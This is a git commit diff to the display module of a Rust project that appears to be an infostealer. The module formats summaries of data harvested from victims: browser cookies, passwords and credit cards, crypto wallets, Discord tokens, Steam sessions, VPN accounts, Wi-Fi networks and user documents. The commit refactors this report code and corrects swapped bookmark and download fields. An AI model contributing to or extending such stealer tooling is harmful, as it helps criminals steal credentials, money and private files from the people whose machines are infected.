f504024d6f34e091e3add43177d9aab68d82c73b
sqlerrorthing <148702857+sqlerrorthing@users.noreply.github.com>
2025-07-29 16:47:00 +0800

    fix: collector (#88)

--- collector/src/display.rs
+++ collector/src/display.rs
@@ -63,143 +63,75 @@ impl Display for EmojiBoolean {
     }
 }
 
-#[repr(transparent)]
-struct BrowserDisplay<'a, T: Browser>(&'a T);
-
-#[repr(transparent)]
-struct SoftwareDisplay<'a, T: Software>(&'a T);
-
-#[repr(transparent)]
-struct FileGrabberDisplay<'a, T: FileGrabber>(&'a T);
-
-#[repr(transparent)]
-struct VpnDisplay<'a, T: Vpn>(&'a T);
-
-#[repr(transparent)]
-struct DeviceDisplay<'a, T: Device>(&'a T);
-
-impl<'a, T: Browser> DisplayBuilder for BrowserDisplay<'a, T> {
-    fn build_block(&self) -> CollectorBlock {
-        let browser = self.0;
-        collector_block!(
-            "🔍",
-            "Browser Data",
-            [
-                ("🍪", "Cookies", browser.get_cookies()),
-                ("🔐", "Passwords", browser.get_passwords()),
-                ("💳", "Credit Cards", browser.get_credit_cards()),
-                ("✍️", "Autofills", browser.get_auto_fills()),
-                ("🕘", "History", browser.get_history()),
-                ("📑", "Bookmarks", browser.get_downloads()),
-                ("⬇️", "Downloads", browser.get_bookmarks()),
-            ]
-        )
-    }
-}
-
-impl<'a, T: Software> DisplayBuilder for SoftwareDisplay<'a, T> {
-    fn build_block(&self) -> CollectorBlock {
-        let software = self.0;
-        collector_block!(
-            "💻",
-            "Installed Software",
-            [
-                ("👛", "Wallets", software.get_wallets()),
-                ("📁", "FTP Hosts", software.get_ftp_hosts()),
-                ("📲", "Telegram", EmojiBoolean(software.is_telegram())),
-                ("🎮", "Discord Tokens", software.get_discord_tokens()),
-                ("🕹️", "Steam Sessions", software.get_steam_session()),
-            ]
-        )
-    }
-}
-
-impl<'a, T: FileGrabber> DisplayBuilder for FileGrabberDisplay<'a, T> {
-    fn build_block(&self) -> CollectorBlock {
-        let file_grabber = self.0;
-        collector_block!(
-            "📂",
-            "User Files",
-            [
-                ("🧑‍💻", "Source Code", file_grabber.get_source_code_files()),
-                ("🗃️", "Databases", file_grabber.get_database_files()),
-                ("📄", "Documents", file_grabber.get_documents()),
-            ]
-        )
-    }
-}
-
-impl<'a, T: Vpn> DisplayBuilder for VpnDisplay<'a, T> {
-    fn build_block(&self) -> CollectorBlock {
-        let vpn = self.0;
-        collector_block!("🌐", "VPN", [("🔐", "Accounts", vpn.get_accounts()),])
-    }
-}
-
-impl<'a, T: Device> DisplayBuilder for DeviceDisplay<'a, T> {
-    fn build_block(&self) -> CollectorBlock {
-        let vpn = self.0;
-        collector_block!(
-            "📶",
-            "Device Data",
-            [("📡", "Wi-Fi Networks", vpn.get_wifi_networks()),]
-        )
-    }
-}
-
-macro_rules! build_blocks {
-    ($($block:expr),* $(,)?) => {{
-        Arc::from([
-            $($block.build_block()),*
-        ])
-    }};
-}
-
 pub trait CollectorDisplay: Collector {
     fn display_blocks(&self) -> Arc<[CollectorBlock]>;
 }
 
 impl<T: Collector> CollectorDisplay for T {
     fn display_blocks(&self) -> Arc<[CollectorBlock]> {
-        build_blocks!(
-            BrowserDisplay(self.get_browser()),
-            SoftwareDisplay(self.get_software()),
-            FileGrabberDisplay(self.get_file_grabber()),
-            VpnDisplay(self.get_vpn()),
-            DeviceDisplay(self.get_device())
-        )
+        Arc::from([
+            collector_block!(
+                "🔍",
+                "Browser Data",
+                [
+                    ("🍪", "Cookies", self.get_browser().get_cookies()),
+                    ("🔐", "Passwords", self.get_browser().get_passwords()),
+                    ("💳", "Credit Cards", self.get_browser().get_credit_cards()),
+                    ("✍️", "Autofills", self.get_browser().get_auto_fills()),
+                    ("🕘", "History", self.get_browser().get_history()),
+                    ("📑", "Bookmarks", self.get_browser().get_bookmarks()),
+                    ("⬇️", "Downloads", self.get_browser().get_downloads()),
+                ]
+            ),
+            collector_block!(
+                "💻",
+                "Installed Software",
+                [
+                    ("👛", "Wallets", self.get_software().get_wallets()),
+                    ("📁", "FTP Hosts", self.get_software().get_ftp_hosts()),
+                    ("📲", "Telegram", EmojiBoolean(self.get_software().is_telegram())),
+                    ("🎮", "Discord Tokens", self.get_software().get_discord_tokens()),
+                    ("🕹️", "Steam Sessions", self.get_software().get_steam_session()),
+                ]
+            ),
+            collector_block!(
+                "📂",
+                "User Files",
+                [
+                    ("🧑‍💻", "Source Code", self.get_file_grabber().get_source_code_files()),
+                    ("🗃️", "Databases", self.get_file_grabber().get_database_files()),
+                    ("📄", "Documents", self.get_file_grabber().get_documents()),
+                ]
+            ),
+            collector_block!(
+                "🌐",
+                "VPN",
+                [
+                    ("🔐", "Accounts", self.get_vpn().get_accounts()),
+                ]),
+            collector_block!(
+                "📶",
+                "Device Data",
+                [
+                    ("📡", "Wi-Fi Networks", self.get_device().get_wifi_networks()),
+                ]
+            )
+        ])
     }
 }
 
 pub struct PrimitiveDisplayCollector<'a, T: Collector>(pub &'a T);
-struct PrimitiveBlockDisplay<'a>(&'a CollectorBlock);
-
-impl Display for PrimitiveBlockDisplay<'_> {
-    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
-        writeln!(f, "▶ {}:", self.0.name)?;
-
-        let len = self.0.fields.len();
-        for (i, field) in self.0.fields.iter().enumerate() {
-            let prefix = if i == len - 1 { "└─" } else { "├─" };
-            writeln!(f, "{} {}: {}", prefix, field.name, field.value)?;
-        }
-
-        Ok(())
-    }
-}
 
 impl<T: Collector> Display for PrimitiveDisplayCollector<'_, T> {
     fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
-        write!(
-            f,
-            "{}",
-            self.0
-                .display_blocks()
-                .iter()
-                .map(PrimitiveBlockDisplay)
-                .map(|x| x.to_string())
-                .collect::<Vec<_>>()
-                .join("\n")
-        )
+        for block in self.0.display_blocks().iter() {
+            writeln!(f, "▶ {}:", block.name)?;
+            for (i, field) in block.fields.iter().enumerate() {
+                let prefix = if i + 1 == block.fields.len() { "└─" } else { "├─" };
+                writeln!(f, "{} {}: {}", prefix, field.name, field.value)?;
+            }
+        }
+
+        Ok(())
     }
 }
